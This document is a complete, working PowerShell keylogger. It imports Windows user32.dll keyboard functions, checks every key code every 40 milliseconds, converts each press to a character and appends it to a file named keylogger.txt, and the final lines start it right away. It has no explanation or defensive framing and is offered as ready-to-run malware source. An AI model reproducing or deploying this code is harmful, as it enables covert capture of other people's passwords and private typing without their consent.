class KeyLogger {
    [string]$Path
    [psobject]$API

    KeyLogger([string]$path) {
        $this.Path = $path

        # Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

        # Load signatures and make members available
        $this.API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
        
        # Create output file
        New-Item -Path $this.Path -ItemType File -Force | Out-Null
    }

    [bool]IsKeyPressed([int]$keyCode) {
        return $this.API::GetAsyncKeyState($keyCode) -eq -32767
    }

    [string]GetCharForKey([int]$ascii, [int]$virtualKey) {
        $kbstate = New-Object Byte[] 256
        $this.API::GetKeyboardState($kbstate) | Out-Null

        # Check the state of the Shift key
        $isShiftPressed = ($kbstate[0x10] -band 0x80) -ne 0

        # Prepare a StringBuilder to receive the input key
        $charBuffer = New-Object -TypeName System.Text.StringBuilder -ArgumentList 2

        # Translate the virtual key
        $this.API::ToUnicode($ascii, $virtualKey, $kbstate, $charBuffer, $charBuffer.Capacity, 0)

        # Adjust for Caps Lock and Shift
        $char = $charBuffer.ToString()
        if ($isShiftPressed -xor ([console]::CapsLock)) {
            $char = $char.ToUpper()
        }

        return $char
    }

    [void]LogKey([string]$key) {
        [System.IO.File]::AppendAllText($this.Path, $key, [System.Text.Encoding]::Unicode)
    }

    [void]Start() {
        try {
            while ($true) {
                Start-Sleep -Milliseconds 40
                for ($ascii = 9; $ascii -le 254; $ascii++) {
                    if ($this.IsKeyPressed($ascii)) {
                        $virtualKey = $this.API::MapVirtualKey($ascii, 3)
                        $char = $this.GetCharForKey($ascii, $virtualKey)
                        if ($char -ne [string]::Empty) {
                            $this.LogKey($char)
                        }
                    }
                }
            }
        }
        finally {
            exit
        }
    }
}

# Initialize and start the keylogger
$keyLogger = [KeyLogger]::new("keylogger.txt")
$keyLogger.Start()
